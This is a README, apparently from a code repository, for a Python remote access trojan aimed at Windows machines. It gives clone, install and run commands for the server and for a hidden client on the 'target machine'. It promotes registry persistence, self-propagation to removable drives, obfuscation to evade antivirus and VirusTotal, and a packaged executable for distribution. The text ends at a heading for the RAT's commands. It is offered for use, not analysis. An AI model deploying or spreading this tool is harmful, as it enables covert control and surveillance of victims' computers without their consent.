# **Python RAT - Remote Access Tool**

This project is an advanced Remote Access Tool (RAT) for Windows systems, written in Python. It has been modified and improved from an original repository with several additional features.

## **Target Systems**

Windows operating systems.

## **Requirements**

Before running the RAT, ensure you have the following modules and dependencies installed:

- Pillow
- pywin32
- opencv-python
- comtypes
- pycaw (requires C++ Build Tools) (optional feature)
- pyautogui
- vidstream (requires VS Code) (optional feature)

Additional requirements:

- Python 3.x installed.
- PyInstaller is used for compiling to an executable.

## **Server Usage**

Follow these steps to run the server:

```bash
git clone https://github.com/Isi-17/Python-RAT
cd Python-RAT
pip install -r server_requirements.txt
python server.py
```

## **Client Usage**

To run the client on the target machine:

```bash
git clone https://github.com/Isi-17/Python-RAT
cd Python-RAT
pip install -r client_requirements.txt
pythonw client.pyw
```

### **Improvement made:**

The client has also been packaged as an executable for easier distribution:

- The compressed executable file is located in the `dist` folder under the name **client.exe**.

## **Modifications Made**

The following enhancements and additional features have been added to the original code:

### 1. **Persistence (Function f1)**

A persistence feature has been added that allows the RAT to run automatically when the operating system starts. This function creates a registry key in the Windows system to ensure continuous execution.

### 2. **Automatic Propagation to Removable Media (Function f2)**

The RAT can now automatically replicate itself on connected devices. This functionality enables malware propagation through removable drives.

### 3. **Code Obfuscation**

The entire client code (`client.pyw`) has been obfuscated, significantly reducing the likelihood of detection by antivirus programs. This helps avoid detection by analysis tools such as VirusTotal.

### 4. **Compilation to Executable**

The RAT has been packaged as an executable file (**client.exe**) in the `dist` folder, allowing easier distribution without relying on Python installation on the target machine.

## **Available Commands in the RAT**
